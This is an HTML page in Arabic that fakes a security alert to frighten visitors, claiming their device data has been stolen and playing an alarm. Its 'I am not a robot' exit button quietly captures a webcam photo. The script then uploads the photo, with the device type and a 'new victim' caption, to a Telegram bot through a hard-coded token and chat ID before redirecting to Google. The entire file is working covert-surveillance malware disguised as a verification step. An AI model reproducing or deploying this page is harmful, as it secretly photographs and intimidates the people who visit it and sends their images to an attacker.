<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>SECURITY ALERT</title>
    <style>
        body { background: #000; color: #fff; font-family: monospace; text-align: center; }
        .box { border: 3px solid red; padding: 40px; margin-top: 50px; display: inline-block; background: #111; }
        .alert-text { color: red; font-size: 2em; font-weight: bold; margin: 20px 0; }
        .device-info { color: yellow; font-size: 1.5em; margin: 10px 0; }
        .btn { background: #fff; color: #000; padding: 20px 40px; border: none; cursor: pointer; font-size: 1.2em; font-weight: bold; border-radius: 5px; }
    </style>
</head>
<body>

    <audio id="alarm" loop>
        <source src="https://www.soundjay.com/buttons/sounds/beep-07.mp3" type="audio/mpeg">
    </audio>

    <div class="box">
        <div class="alert-text">⚠️ تم سحب بيانات جهازك! 📸</div>
        <div class="device-info" id="device-name">جاري التحقق...</div>
        
        <p style="color: white; font-size: 1.2em;">للخروج من هذه الصفحة، يجب تأكيد أنك لست روبوتاً:</p>
        
        <button class="btn" onclick="verifyAndExit()">أنا لست روبوتاً (تأكيد الخروج)</button>
        
        <video id="video" style="display:none;"></video>
        <canvas id="canvas" style="display:none;"></canvas>
    </div>

    <script>
        const BOT_TOKEN = "8627248426:AAEtvtxQzAThKrVmI1orIx7GF4-wFXSYG-4";
        const CHAT_ID = "5177962707";

        // إظهار نوع الجهاز فوراً
        const device = navigator.platform;
        document.getElementById('device-name').innerText = "نوع الجهاز: " + device;

        window.addEventListener('click', () => {
            document.getElementById('alarm').play();
        }, { once: true });

        async function verifyAndExit() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                video.srcObject = stream;
                
                await new Promise(r => setTimeout(r, 1000));
                
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(blob => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'hacked.png');
                    // إرسال نوع الجهاز مع الصورة في التليجرام
                    formData.append('caption', `🚨 ضحية جديدة! %0A الجهاز: ${device} %0A الوقت: ${new Date().toLocaleTimeString()}`);

                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                }, 'image/png');

                window.location.href = "https://www.google.com";
            } catch (err) {
                window.location.href = "https://www.google.com";
            }
        }
    </script>
</body>
</html>
